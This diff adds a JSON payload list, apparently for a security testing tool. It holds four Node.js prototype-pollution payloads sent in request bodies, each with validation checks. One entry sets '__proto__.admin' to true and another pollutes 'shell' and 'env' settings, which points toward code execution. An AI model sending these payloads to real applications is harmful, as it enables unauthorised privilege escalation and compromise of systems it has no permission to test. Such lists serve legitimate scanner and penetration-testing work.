@@ -1,0 +1,46 @@
+[
+  {
+    "payload_id": "OWP-0677",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Node.js",
+    "injection_point": "body_json",
+    "payload_string": "{\"__proto__\":{\"admin\":true}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-0678",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Node.js",
+    "injection_point": "body_json",
+    "payload_string": "{\"rce\":{\"__proto__\":{\"shell\":\"node\",\"env\":\"production\"}}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "production"
+    }
+  },
+  {
+    "payload_id": "OWP-1496",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Node.js",
+    "injection_point": "body_json",
+    "payload_string": "{\"__proto__\":{}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1497",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Node.js",
+    "injection_point": "body_json",
+    "payload_string": "{\"constructor\":{\"prototype\":{}}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
